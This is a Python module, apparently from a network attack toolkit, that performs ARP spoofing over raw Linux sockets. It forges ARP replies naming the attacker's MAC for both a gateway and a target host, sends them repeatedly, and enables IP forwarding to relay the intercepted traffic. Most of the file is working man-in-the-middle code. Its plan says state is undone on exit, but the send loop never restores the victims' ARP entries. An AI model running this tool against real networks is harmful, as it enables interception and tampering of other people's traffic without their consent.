"""ARP spoofing module. Stdlib raw ``AF_PACKET`` sockets (Linux).

Live transmission requires root and ``--apply``; everything else is preview.
"""

from __future__ import annotations

import socket
import struct
import threading
from pathlib import Path
from typing import Dict, Optional

from .netplan import OpPlan, iface_exists, iface_mac, read_ip_forward

ETH_P_ALL = 0x0003
ARP_TYPE = 0x0806


def mac_to_bytes(mac: Optional[str]) -> bytes:
    if not mac:
        return b"\xff" * 6
    try:
        return bytes(int(part, 16) for part in mac.split(":"))
    except (ValueError, AttributeError):
        return b"\xff" * 6


def mac_to_str(mac: bytes) -> str:
    return ":".join(f"{b:02x}" for b in mac)


def build_arp_reply_frame(
    our_mac: bytes,
    sender_ip: str,
    target_ip: str,
    target_mac: Optional[bytes] = None,
) -> bytes:
    """Ethernet + ARP reply of ``sender_ip`` is-at ``our_mac``."""
    dst = target_mac or (b"\xff" * 6)
    ether = dst + our_mac + struct.pack("!H", ARP_TYPE)
    arp = (
        struct.pack("!H", 1)       # htype: ethernet
        + struct.pack("!H", 0x0800)  # ptype: IPv4
        + bytes([6, 4])            # hlen, plen
        + struct.pack("!H", 2)     # opcode: reply
        + our_mac
        + socket.inet_aton(sender_ip)
        + dst
        + socket.inet_aton(target_ip)
    )
    frame = ether + arp
    if len(frame) < 60:
        frame += b"\x00" * (60 - len(frame))
    return frame


def arp_lookup(ip: str) -> Optional[str]:
    """Look up ``ip`` in the kernel ARP table (/proc/net/arp)."""
    try:
        table = Path("/proc/net/arp").read_text()
    except OSError:
        return None
    for line in table.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 4 and parts[0] == ip and parts[3] != "incomplete":
            return parts[3]
    return None


def plan_arp(iface: str, gateway: str, target: str) -> OpPlan:
    plan = OpPlan(f"ARP spoof: {target} <-> {gateway} via {iface}")
    if not iface_exists(iface):
        plan.add_message(f"WARNING: interface '{iface}' not present on this host")
    our_mac = iface_mac(iface)
    plan.add_message(f"attacker interface {iface} MAC: {our_mac or 'UNKNOWN'}")
    plan.add_message(
        f"send gratuitous ARP replies (gateway={gateway}, target={target}, "
        f"attacker={our_mac or '<our-mac>'}): victim -> gateway and gateway -> victim"
    )
    plan.add_message("restore on exit: repeat until SIGINT then undo state")
    prior = read_ip_forward()
    if prior == "0":
        plan.add_sysctl(
            "enable IP forwarding for traffic relay",
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            rollback=[["sysctl", "-w", f"net.ipv4.ip_forward={prior}"]],
        )
    return plan


def execute_arp(
    iface: str,
    gateway: str,
    target: str,
    interval: float,
    count: int,
    store,
    writer,
    log,
    pcap=None,
    stop: Optional[threading.Event] = None,
) -> Dict[str, object]:
    """Run endless ARP spoof until stop(Event) or count exhausted."""
    stop = stop or threading.Event()
    our_mac = iface_mac(iface)
    if not our_mac:
        raise RuntimeError(f"cannot read MAC for interface '{iface}'")
    our_mac_b = mac_to_bytes(our_mac)
    gw_mac = arp_lookup(gateway)
    tgt_mac = arp_lookup(target)
    if gw_mac is None:
        log.warning("gateway %s not in ARP table; using broadcast as fallback", gateway)
    if tgt_mac is None:
        log.warning("target %s not in ARP table; using broadcast as fallback", target)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    sock.bind((iface, 0))

    target_frame = build_arp_reply_frame(
        our_mac_b, gateway, target, mac_to_bytes(tgt_mac)
    )
    gateway_frame = build_arp_reply_frame(
        our_mac_b, target, gateway, mac_to_bytes(gw_mac)
    )

    frames_sent = 0
    writer.emit(
        "arp",
        "arp_spoof_start",
        "info",
        {"gateway": gateway, "target": target},
    )
    log.info("arp spoof started: %s <-> %s (attacker %s)", gateway, target, our_mac)
    store.record_event("arp", "arp_spoof_start", "info", {"gateway": gateway, "target": target})

    try:
        while not stop.is_set():
            sock.send(gateway_frame)
            sock.send(target_frame)
            frames_sent += 2
            if pcap:
                pcap.write(gateway_frame)
                pcap.write(target_frame)
            if count and (frames_sent // 2) >= count:
                break
            if stop.wait(interval):
                break
    finally:
        sock.close()
    summary = {
        "frames_sent": frames_sent,
        "gateway": gateway,
        "gateway_mac": gw_mac or "broadcast",
        "target": target,
        "target_mac": tgt_mac or "broadcast",
    }
    store.record_event("arp", "arp_spoof_stop", "info", summary)
    writer.emit("arp", "arp_spoof_stop", "info", summary)
    log.info("arp spoof stopped: %s", summary)
    return summary